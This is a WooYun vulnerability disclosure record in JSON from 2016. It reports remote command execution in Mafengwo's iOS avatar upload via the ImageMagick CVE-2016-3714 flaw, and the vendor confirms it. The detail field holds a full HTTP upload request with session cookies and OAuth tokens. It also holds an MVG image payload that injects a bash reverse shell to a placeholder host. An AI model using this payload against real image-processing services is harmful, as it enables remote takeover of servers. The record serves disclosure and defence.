{"id": 87882, "wybug_id": "wooyun-2016-0205493", "wybug_title": "马蜂窝某站远程命令执行                                      ", "wybug_corp": "蚂蜂窝", "wybug_author": "路人甲", "wybug_date": "2016-05-05 22:20", "wybug_open_date": "2016-06-19 23:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向公众公开  简要描述：  详细说明：  目标：蚂蜂窝IOS APP头像上传地方存在CVE-2016-3714 - ImageMagick 命令执行分析\nPOST https://m.mafengwo.cn/nb/public/xauth_change_user.php HTTP/1.1Host: m.mafengwo.cnContent-Type: multipart/form-data; boundary=Boundary+454EDE5BD920AC77Accept-Encoding: gzip, deflateCookie: PHPSESSID=ge39jptbg3r1hujdm9bhgqps55; __idfa=564443CC-9189-42C1-9CC9-0922116AD5C4; __idfv=CA34ED38-8E5B-4526-ADC2-201F233A5707; __mfwuuid=a811fb2e-75d5-fbb3-07c4-23a20157abf8; __openudid=34c68951fec87de860a9802862152f33442f8c37; mfw_uid=91729966; mfw_uuid=572b4a14-f864-0900-2f51-39ea5fc6ed2c; oad_n=a%3A3%3A%7Bs%3A3%3A%22oid%22%3Bi%3A2581%3Bs%3A2%3A%22dm%22%3Bs%3A13%3A%22m.mafengwo.cn%22%3Bs%3A2%3A%22ft%22%3Bs%3A19%3A%222016-05-05+21%3A26%3A44%22%3B%7DConnection: keep-aliveProxy-Connection: keep-aliveAccept: */*User-Agent: TravelGuideMdd/7.4.4 (iPhone; iOS 9.3.1; Scale/2.00),Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 mfwappcode/cn.mafengwo.www mfwappver/7.4.4 mfwsdk/20160401 mfwjssdk/0.1Accept-Language: zh-Hans-CN;q=1, en-US;q=0.9Content-Length: 2731Accept-Webp: 1--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"app_code\"cn.mafengwo.www--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"app_ver\"7.4.4--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"channel_id\"App Store--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"device_token\"95d871b76de2867dc8723af43a258c990fc6c6f5a565fccc20410adcd4e73f23--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"device_type\"ios--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"hardware_model\"iPhone8,1--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"idfa\"564443CC-9189-42C1-9CC9-0922116AD5C4--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"idfv\"CA34ED38-8E5B-4526-ADC2-201F233A5707--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"mfwsdk_ver\"20160401--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"o_lat\"22.614055--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"o_lng\"114.035890--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_consumer_key\"4--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_nonce\"841a666f5d33a774deab83527c05188c--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_signature\"eL4MWstOj/x9mADziX8rlQHsgA0=--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_signature_method\"HMAC-SHA1--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_timestamp\"1462455168--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_token\"91729966_778cee2f668645fee3e66a124d659eae--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"oauth_version\"1.0--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"open_udid\"34c68951fec87de860a9802862152f33442f8c37--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"screen_scale\"2--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"sys_ver\"9.3.1--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"time_offset\"480--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"uid\"91729966--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"x_auth_mode\"client_auth--Boundary+454EDE5BD920AC77Content-Disposition: form-data; name=\"ulogo\"; filename=\"ulogo\"Content-Type: image/jpegpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|bash -i >& /dev/tcp/xxx.xxx.xxx/2015 0>&1\")'pop graphic-context--Boundary+454EDE5BD920AC77--\n   漏洞证明：  反弹shell\n\n   修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-05-05 22:54 厂商回复： 谢谢，我们马上处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-05 23:04 |    \t\ttoomi \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        | 小菜一枚)\t\t \n  今晚好多人都要加班啊。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}